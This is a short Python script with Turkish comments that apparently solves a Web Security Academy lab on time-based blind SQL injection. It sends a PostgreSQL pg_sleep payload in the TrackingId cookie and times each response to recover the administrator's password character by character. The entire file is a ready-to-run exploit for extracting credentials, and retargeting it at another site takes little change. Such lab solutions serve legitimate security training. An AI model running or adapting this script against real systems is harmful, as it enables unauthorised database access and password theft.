import requests
import string
import time

# Hedef URL
url = "https://0a4a00b80352144b82cc016500e2002f.web-security-academy.net/"

# Çekilecek verinin pozisyonu
position = 1
founded_word = ""

# Denenecek karakterler (a-z, A-Z, 0-9, özel karakterler)
char_list = string.ascii_letters + string.digits + "!@#$%^&*()_+"

while True:
    found_char = None

    for char in char_list:
        # SQL Injection Payload (TrackingId parametresine yerleştiriyoruz)
        payload = f"DXRJXw2nY3d9uGf6'||(SELECT CASE WHEN(username='administrator' AND SUBSTRING(password,{position},1)='{char}') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)||'"

        # HTTP isteği gönder
        cookies = {"TrackingId": payload}
        start_time = time.time()
        response = requests.get(url, cookies=cookies)

        elapsed_time = time.time() - start_time
        if elapsed_time > 9:
            founded_word += char
            print(f"[+] Bulunan Harf {char} - Güncel Kelime: {founded_word}")
            found_char = char
            break

    if found_char is None:
        break

    position += 1

print(f"[+] Bulunan Sonuç: {founded_word}")
